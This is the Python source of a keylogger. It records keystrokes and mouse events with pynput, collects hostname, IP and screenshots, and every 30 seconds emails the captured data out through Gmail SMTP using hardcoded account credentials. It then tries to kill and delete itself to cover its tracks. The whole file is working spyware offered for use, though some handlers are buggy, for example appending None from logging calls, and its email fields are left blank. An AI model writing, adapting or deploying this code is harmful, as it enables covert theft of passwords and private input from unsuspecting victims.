import logging
import os
import platform
import smtplib
import socket
import threading
import pyscreenshot
from pynput import keyboard
from pynput.keyboard import Listener


email_address = "yopinkman1@gmail.com"
email_password = "Y0p1nkm4n."
send_report_time = 30

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = ""
        self.email = email
        self.password = password

    def append_log(self, string):
        self.log = self.log + string

    def on_click(self, a, b):
        current_click = logging.info("Mouse moved to {} {}".format(a, b))
        self.append_log(current_click)

    def on_move(self, a, b):
        current_move = logging.info("Mouse moved to {} {}".format(a, b))
        self.append_log(current_move)

    def on_scroll(self, a, b):
        current_scroll = logging.info("Mouse moved to {} {}".format(a, b))
        self.append_log(current_scroll)

    def hooked_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "

        self.append_log(current_key)

    def send_mail(self, email, password, message):
        sender = ""
        receiver = ""

        mail = f"""\
                Subject: Hooked Data
                To: {receiver}
                From: {sender}
                """
        mail += message
        email_server = smtplib.SMTP("smtp.gmail.com", 587)
        email_server.starttls()
        email_server.login(email, password)
        email_server.sendmail(sender, receiver, mail)
        email_server.quit()

    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer_object = threading.Timer(self.interval, self.report)
        timer_object.start()

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        system = platform.system()
        self.append_log(hostname)
        self.append_log(ip)
        self.append_log(system)

    def screenshot(self):
        img = pyscreenshot.grab()
        self.send_mail(email=email_address, password=email_password, message=img)

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.hooked_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
        with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
            mouse_listener.join()
        if os.name == "nt":
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd<" + pwd)
                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                print('ok')
                os.system("DEL" + os.path.basename(__file__))
            except OSError:
                print('ok')

        else:
            try:
                pwd = os.path.abspath(os.getcwd())
                os.system("cd" + pwd)
                os.system('pkill leafpad')
                os.system("chattr -i " + os.path.basename(__file__))
                print('ok')
                os.system("rm -rf" + os.path.basename(__file__))
            except OSError:
                print('ok')


keylogger = KeyLogger(send_report_time, email_address, email_password)
keylogger.run()




